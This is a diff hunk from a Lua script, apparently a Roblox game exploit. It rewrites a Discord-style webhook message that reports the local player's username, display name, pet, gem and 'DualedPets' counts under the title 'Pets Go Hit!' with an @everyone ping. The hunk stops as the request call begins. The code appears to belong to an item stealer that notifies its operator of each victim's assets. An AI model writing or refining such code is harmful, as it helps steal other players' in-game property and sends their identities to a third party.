@@ -3,9 +3,9 @@ print(_G.wh)
 print(_G.whb)
 local msg = ""
 if dh then
-msg = '{"embeds":[{"id":449684281,"fields":[{"id":660857133,"name":"👨User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"id":312802545,"value":"'..pn..'","name":"🐾Pets","inline":true},{"id":263524395,"value":"'..gn..'","name":"💎Gems","inline":true},{"id":263511395,"value":"'..dp..'","name":"💎DualedPets","inline":true}],"title":"Pets Go Hit!","thumbnail":{"url":"https://yt3.googleusercontent.com/AkuAaPowxMMFkQP-YfPgGasKISeZwTZlQQ3C234sDL-rdjaSKSyYZIxF-k_0OnqUWqqBhqTM=s160-c-k-c0x00ffffff-no-rj"}}],"tts":false,"actions":[],"content":"@everyone","components":[]}'
+msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 else
-msg = '{"embeds":[{"id":449684281,"fields":[{"id":660857133,"name":"👨User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"id":312802545,"value":"'..pn..'","name":"🐾Pets","inline":true},{"id":263524395,"value":"'..gn..'","name":"💎Gems","inline":true}],"title":"Pets Go Hit!","thumbnail":{"url":"https://yt3.googleusercontent.com/AkuAaPowxMMFkQP-YfPgGasKISeZwTZlQQ3C234sDL-rdjaSKSyYZIxF-k_0OnqUWqqBhqTM=s160-c-k-c0x00ffffff-no-rj"}}],"tts":false,"actions":[],"content":"@everyone","components":[]}'
+msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true}],"title":"Pets Go Hit!"}],"tts":false,"content":"@everyone"}'
 end
 local response =
         request(
